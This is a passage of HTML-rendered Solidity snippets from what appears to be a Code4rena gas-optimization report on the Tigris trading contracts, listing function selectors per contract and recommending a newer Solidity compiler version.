class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit distribute(), safeTransferMany(), claim(), pending()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IGovNFT</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IGovNFT.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILayerZeroEndpoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit send(), receivePayload(), getInboundNonce(), getOutboundNonce(), estimateFees(), getChainId(), retryPayload(), hasStoredPayload(), getSendLibraryAddress(), getReceiveLibraryAddress(), isSendingPayload(), isReceivingPayload(), getConfig(), getSendVersion(), getReceiveVersion()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ILayerZeroEndpoint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ILayerZeroUserApplicationConfig</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroEndpoint.sol#L7</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILayerZeroReceiver</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit lzReceive()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ILayerZeroReceiver</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroReceiver.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ILayerZeroUserApplicationConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit setConfig(), setSendVersion(), setReceiveVersion(), forceResumeReceive()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ILayerZeroUserApplicationConfig</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroUserApplicationConfig.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit allowedAsset(), idToAsset(), idToOi(), setAssetBaseFundingRate(), modifyLongOi(), modifyShortOi()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPairsContract</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPairsContract.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit trades(), executeLimitOrder(), modifyMargin(), addToPosition(), reducePosition(), assetOpenPositions(), assetOpenPositionsIndexes(), limitOrders(), limitOrderIndexes(), assetOpenPositionsLength(), limitOrdersLength(), ownerOf(), mint(), burn(), modifyTp(), modifySl(), getCount(), updateFunding(), setAccInterest()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPosition</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IReferrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit createReferralCode(), setReferred(), getReferred(), getReferral()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IReferrals</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IReferrals.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IStableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit deposit(), withdraw(), allowed(), stable()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IStableVault</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IStableVault.sol#L5</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ITrading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit initiateMarketOrder(), initiateCloseOrder(), addMargin(), removeMargin(), addToPosition(), initiateLimitOrder(), cancelLimitOrder(), updateTpSl(), executeLimitOrder(), liquidatePosition(), limitClose()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ITrading</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L7</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit claim(), claimDebt(), lock(), extendLock(), release(), claimGovFees(), editAsset(), sendNFTs()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Lock</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\">{</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit idToAsset(), idToOi(), setAssetChainlinkFeed(), addAsset(), updateAssetLeverage(), setAssetBaseFundingRate(), updateAssetFeeMultiplier(), pauseAsset(), setMaxBaseFundingRate(), setProtocol(), setMaxOi(), modifyLongOi(), modifyShortOi()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IPairsContract</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L8</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit isMinter(), trades(), openPositions(), openPositionsIndexes(), assetOpenPositions(), assetOpenPositionsIndexes(), limitOrders(), limitOrderIndexes(), setBaseURI(), updateFunding(), mint(), executeLimitOrder(), modifyMargin(), addToPosition(), setAccInterest(), reducePosition(), modifyTp(), modifySl(), burn(), assetOpenPositionsLength(), limitOrdersLength(), getCount(), userTrades(), openPositionsSelection(), setMinter()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L9</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit createReferralCode(), setReferred(), getReferred(), getReferral(), setProtocol(), initRefs()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IReferrals</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L7</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit mintFor(), setMinter()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20Permit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L7</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit mintFor()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20Mintable</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit deposit(), depositWithPermit(), withdraw(), listToken(), delistToken()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">:   </span><span class=\"mtk10\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk10\">StableVault</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetaContext</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IStableVault</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L9</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit minPos(), _closePosition(), _limitClose(), _checkGas(), modifyShortOi(), modifyLongOi(), setMaxGasPrice(), getRef(), getVerifiedPrice(), _setReferral(), validateTrade(), setValidSignatureTimer(), setChainlinkEnabled(), setNode(), setAllowedMargin(), setMinPositionSize(), setPaused()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\">{</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L10</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit getVerifiedPrice(), getRef(), _setReferral(), validateTrade(), isPaused(), minPos(), modifyLongOi(), modifyShortOi(), _limitClose(), _checkGas(), _closePosition()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ITradingExtension</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit burnFrom(), mintFor()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:   </span><span class=\"mtk10\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IStable</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit initiateMarketOrder(), initiateCloseOrder(), addToPosition(), initiateLimitOrder(), cancelLimitOrder(), addMargin(), removeMargin(), updateTpSl(), executeLimitOrder(), liquidatePosition(), limitClose(), approveProxy(), setBlockDelay(), setAllowedVault(), setMaxWinPercent(), setLimitOrderPriceRange(), setFees(), setTradingExtension()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:   </span><span class=\"mtk10\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Trading</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetaContext</span><span class=\"mtk1\">, </span><span class=\"mtk10\">ITrading</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L14</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit setTrustedForwarder(), isTrustedForwarder()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L6</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit pnl(), liqPrice(), getLiqPrice(), verifyPrice()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">library</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L21</p>\n<h2 id=\"g15--use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#g15--use-a-more-recent-version-of-solidity\" aria-label=\"g15  use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑15]  Use a more recent version of solidity</h2>\n<p>Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining</p>\n<p>Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads</p>\n<p>Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than <code>revert()/require()</code> strings</p>\n<p>Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value</p>\n<p><em>There are 21 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L2</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IGovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IGovNFT.sol#L3</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span 